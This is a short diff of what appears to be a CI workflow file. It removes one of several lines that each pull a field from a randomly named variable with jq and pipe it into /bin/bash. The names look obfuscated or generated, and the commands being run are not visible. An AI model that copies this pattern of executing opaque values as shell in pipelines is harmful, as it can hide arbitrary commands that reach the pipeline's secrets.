@@ -21,7 +21,6 @@ jobs:
           echo $veon9 | jq -r .u76 | /bin/bash
           echo $l10793 | jq -r .rbe4120 | /bin/bash
           printf '%s' "$selml2929" | jq -r .ue9212 | /bin/bash
-          echo $gajgs22249 | jq -r .b1140 | /bin/bash
           printf '%s' "$e97197" | jq -r .oumz435 | /bin/bash
 
       - name: Upload data
